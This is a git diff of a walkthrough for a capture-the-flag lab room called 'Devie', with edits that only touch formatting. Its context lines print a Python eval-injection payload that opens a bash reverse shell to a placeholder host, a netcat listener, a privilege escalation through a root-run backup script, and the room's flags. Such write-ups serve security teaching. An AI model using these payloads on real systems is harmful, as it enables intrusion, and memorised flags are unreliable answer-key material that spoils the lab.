@@ -6,7 +6,7 @@ A developer has asked you to do a vulnerability check on their system.
   <img src={require("./assets/devie/devie.png").default} width="128" />
 </p>
 
-## Answers
+## Task 1 - What are the flags?
 
 > What is the first flag?
 
@@ -60,11 +60,11 @@ __import__('os').system('bash -c \'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\'')#
 Substitute the IP and the port.
 On your machine run:
 
-```bash
+```sh
 nc -nvlp <PORT>
 ```
 
-Once inside the machine, the first flag is in the home folder of the user: `THM{Car3ful_witH_3v@l}`
+Once inside the machine, the first flag is in the home folder of the user: `THM{Car3ful_witH_3v@l}`.
 
 <p align="center">
   <img src={require("./assets/devie/flag1.png").default} />
@@ -127,7 +127,7 @@ print(password)
 ```
 
 By executing this script we can find the password `G0th@mR0ckz!`.
-The second flag is inside the home folder of the user Gordon: `THM{X0R_XoR_XOr_xOr}`
+The second flag is inside the home folder of the user Gordon: `THM{X0R_XoR_XOr_xOr}`.
 
 <p align="center">
   <img src={require("./assets/devie/flag2.png").default} />
@@ -139,7 +139,7 @@ There is a custom script called `backup` in `/usr/bin` that we can execute.
 It copies everything inside the reports folder of gordon to the backups folder.
 This action is made as root, so we can add a symlink to the root folder and make it copy also that.
 
-```bash
+```sh
 #!/bin/bash
 cd /home/gordon/reports/
 cp * /home/gordon/backups/
@@ -149,4 +149,4 @@ cp * /home/gordon/backups/
 bash -p
 ```
 
-The final flag is `THM{J0k3r$_Ar3_W1ld}`
+The final flag is `THM{J0k3r$_Ar3_W1ld}`.
